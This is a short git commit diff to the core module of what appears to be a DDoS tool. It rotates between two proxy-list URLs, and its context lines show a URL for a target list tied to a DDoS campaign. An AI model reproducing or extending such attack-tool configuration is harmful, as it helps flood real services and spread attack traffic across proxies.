28d2dce224f42af5064555c593c12a0acbb7f38d
porthole-ascend-cinnamon <porthole-ascend-cinnamon@protonmail.com>
2022-04-18 10:45:39 +0300

    add another proxies url

--- src/core.py
+++ src/core.py
@@ -1,4 +1,5 @@
 import logging
+import random
 from pathlib import Path
 
 from colorama import Fore
@@ -10,7 +11,10 @@ logger.setLevel('INFO')
 
 ROOT_DIR = Path(__file__).parent.parent
 
-PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt'
+PROXIES_URL = random.choice((
+    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
+    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
+))
 IT_ARMY_CONFIG_URL = 'https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_tcp_v2.txt'
 VERSION_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/mhddos_proxy/main/version.txt'
 
